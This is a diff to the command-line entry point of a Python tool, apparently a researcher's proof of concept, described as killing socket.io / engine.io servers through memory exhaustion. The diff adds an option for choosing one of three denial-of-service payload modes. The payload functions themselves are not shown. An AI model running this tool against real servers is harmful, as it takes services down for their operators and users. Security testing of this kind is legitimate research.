@@ -158,18 +158,25 @@ def oom_nodejs_all(host='http://127.0.0.1:5000', payload_length=DEFAULT_MAX, pat
 
 def main():
     parser = argparse.ArgumentParser(description='Kill socket / engine io', epilog="By Ben Caller. Use responsibly.", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
-    parser.add_argument("host", help="Starting with protocol and ending without a forward slash e.g. https://a.b.c:123")
+    parser.add_argument("host", help="Starting with protocol and ending without a forward slash e.g. http://127.0.0.1:5000")
     parser.add_argument("--path", default=DEFAULT_PATH, help="Location of socket.io endpoint starting without a forward slash")
     parser.add_argument("-l", "--max-length", default=DEFAULT_MAX, help="Maximum payload length to send", type=int)
-    parser.add_argument("-t", "--timeout", default=DEFAULT_TIMEOUT, help="Time out the request after this many seconds", type=int)
+    parser.add_argument("--timeout", default=DEFAULT_TIMEOUT, help="Time out the request after this many seconds", type=int)
     parser.add_argument("-H", "--header", nargs=2, action='append', help="Headers to add to all requests. --header NAME VALUE --header NAME2 VALUE2")
+    parser.add_argument("--payload", default="all", choices=["all", "many-tiny-packets", "giant-packet", "many-heartbeats"])
     args = parser.parse_args()
     headers = None
     if args.header:
         headers = {}
         for k, v in args.header:
             headers[k] = v
-    oom_nodejs_all(args.host, args.max_length, args.path, args.timeout, headers)
+    if args.payload == "all":
+        oom_nodejs_all(args.host, args.max_length, args.path, args.timeout, headers)
+    else:
+        payloads_map = {f.__name__.replace('_', '-'): f for f in (many_tiny_packets, many_heartbeats, giant_packet)}
+        oom_nodejs(args.host, args.max_length, payloads_map[args.payload], args.path, args.timeout, headers)
+
+
 
 if __name__ == '__main__':
     if len(sys.argv) > 1:
